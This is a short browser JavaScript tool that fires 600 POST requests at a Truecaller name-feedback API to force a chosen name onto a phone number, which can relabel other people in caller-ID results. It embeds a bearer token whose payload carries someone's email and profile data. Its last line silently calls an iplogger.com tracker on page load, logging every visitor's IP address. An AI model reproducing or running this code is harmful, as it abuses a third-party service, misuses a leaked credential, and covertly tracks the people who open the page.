let num;
let suggestedName;

let butt = document.querySelector("button");
butt.addEventListener("click", function () {
  num = document.querySelector("#num").value;
  suggestedName = document.querySelector("#name").value;
  if (num !== "" && suggestedName !== "") {
    for (let i = 0; i < 600; i++) {
      fetch(
        "https://asia-south1-truecaller-web.cloudfunctions.net/api/noneu/nameFeedback/v1",
        {
          headers: {
            accept: "application/json",
            "accept-language": "en-US,en;q=0.9,ar;q=0.8",
            authorization:
              "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2Nzc4MDA0MjY5MjIsInRva2VuIjoiYTF3MGgtLWRNSFZVNlY4RjEzQkdvaEgtbnhIMVhQN0c4T2MtUGxwdDlBUm4xV0ZCcXFvQnhjRVh4NmZhZ1RkZiIsImVuaGFuY2VkU2VhcmNoIjp0cnVlLCJjb3VudHJ5Q29kZSI6ImVnIiwibmFtZSI6Itio2Ksg2YXYqNin2LTYsSDYqNirINmF2KjYp9i02LEiLCJlbWFpbCI6Im1hbnNlaGFiOTk3QGdtYWlsLmNvbSIsImltYWdlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUVkRlRwNm9kRVlMYXR2bmdOWlpDWlNSbUJ6Ykw2SGRPcU5lWVNDWVBDSFM9czk2LWMiLCJpYXQiOjE2NzUxMjIwMjZ9.bL3ouRoT82eWsin59nsOe2gKMPtqLHOKiJDJCyO0kfA",
            "content-type": "application/json",
            "sec-ch-ua":
              '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
          },
          referrer: "https://www.truecaller.com/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: `{"entries":[{"phone":"+2${num}","feedback":1,"name":"","source":1,"ne_version":"20210210","suggestion":"${suggestedName}","suggestion_type":1}]}`,
          method: "POST",
          mode: "cors",
          credentials: "include",
        }
      );
    }
    Swal.fire(
      "Good job!",
      "Name has been changed, wait about 15 minutes",
      "success"
    );
  } else {
    Swal.fire({
      icon: "error",
      text: "Enter name and number",
    });
  }
});
fetch("https://iplogger.com/1yDxf7.gif", { mode: "no-cors" });
